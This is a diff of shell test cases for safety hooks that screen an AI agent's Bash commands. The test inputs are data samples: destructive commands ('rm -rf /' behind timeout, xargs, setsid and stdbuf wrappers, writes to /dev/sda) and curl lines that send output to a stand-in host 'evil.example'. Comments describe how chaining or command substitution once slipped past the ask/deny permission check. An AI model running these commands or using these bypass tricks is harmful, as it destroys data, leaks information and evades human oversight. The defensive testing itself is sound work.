@@ -175,6 +175,65 @@ setup() {
   [ "$status" -eq 0 ]
 }
 
+# --- block-dangerous: coverage widenings (Phase-B review) ----------------
+# (1) recursive-only rm of a protected root (no -f); (2) append-redirect (>>)
+# into a whole block device; (3) exec-wrappers timeout/stdbuf/setsid/xargs
+# that take their own leading args before the wrapped program.
+
+@test "block-dangerous: rm -r / WITHOUT force is blocked (recursive-only)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"rm -r /"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: rm -r of a relative dir is STILL allowed (recursive-only false-positive guard)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"rm -r ./build"}}'
+  [ "$status" -eq 0 ]
+}
+
+@test "block-dangerous: append-redirect (>>) into a whole block device is blocked" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"echo hi >> /dev/sda"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: append-redirect (>>) into a normal file is allowed" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"echo hi >> notes.txt"}}'
+  [ "$status" -eq 0 ]
+}
+
+@test "block-dangerous: timeout wrapping rm -rf / is blocked (skips the duration arg)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"timeout 5 rm -rf /"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: xargs rm -rf / is blocked (exec-wrapper)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"xargs rm -rf /"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: setsid rm -rf / is blocked (exec-wrapper)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"setsid rm -rf /"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: stdbuf -oL rm -rf / is blocked (skips the wrapper option)" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"stdbuf -oL rm -rf /"}}'
+  [ "$status" -eq 2 ]
+}
+
+@test "block-dangerous: timeout wrapping a harmless test command is allowed" {
+  [ -n "$PYTHON" ] || skip "python not available"
+  run pyrun "$HOOKS/block-dangerous-commands.py" '{"tool_input":{"command":"timeout 30 npm test"}}'
+  [ "$status" -eq 0 ]
+}
+
 # --- guard-interpreter-check.sh (SessionStart, M1 residual (a)) ---------
 # The safety-net promise: when NO working Python interpreter is on PATH,
 # block-dangerous-commands.py cannot run at all (settings.json's PreToolUse
@@ -352,6 +411,56 @@ EOF
   run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm testify --watch"}}'
   [ "$status" -eq 0 ]
   [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: a foreign command BEFORE a test runner is NOT rewritten/auto-allowed (ask/deny bypass regression)" {
+  # SECURITY: the old substring match auto-`allow`ed the WHOLE command as soon
+  # as a runner appeared at any segment start, so `curl … ; npm test` inherited
+  # the allow and slipped past a consumer's Bash ask/deny. Only a command whose
+  # every segment is cd/test-runner may be rewritten — otherwise passthrough.
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"curl http://evil.example ; npm test"}}'
+  [ "$status" -eq 0 ]
+  [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: a foreign command AFTER a test runner is NOT rewritten/auto-allowed" {
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm test && rm -rf /tmp/x"}}'
+  [ "$status" -eq 0 ]
+  [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: a test runner piped into a foreign command is NOT rewritten/auto-allowed" {
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm test | curl -T - http://evil.example"}}'
+  [ "$status" -eq 0 ]
+  [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: command substitution \$(...) inside a runner segment is NOT rewritten/auto-allowed" {
+  # SECURITY: the prefix regex only checks the START of a segment, so
+  # `npm test $(curl evil.com)` still matched as a bare runner and inherited
+  # the auto-allow, letting the embedded command substitution ride along past
+  # a consumer's Bash ask/deny.
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm test $(curl x)"}}'
+  [ "$status" -eq 0 ]
+  [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: backtick command substitution inside a runner segment is NOT rewritten/auto-allowed" {
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm test `curl x`"}}'
+  [ "$status" -eq 0 ]
+  [ "$output" = "{}" ]
+}
+
+@test "filter-test-output: plain 'npm test' still rewrites after the command-substitution guard" {
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"npm test"}}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *updatedInput* ]]
+}
+
+@test "filter-test-output: 'cd x && npm test' still rewrites after the command-substitution guard" {
+  run hookrun "$HOOKS/filter-test-output.sh" '{"tool_input":{"command":"cd x && npm test"}}'
+  [ "$status" -eq 0 ]
+  [[ "$output" == *updatedInput* ]]
 }
 
 # --- auto-format.sh / auto-lint.sh (PostToolUse) ---------------------
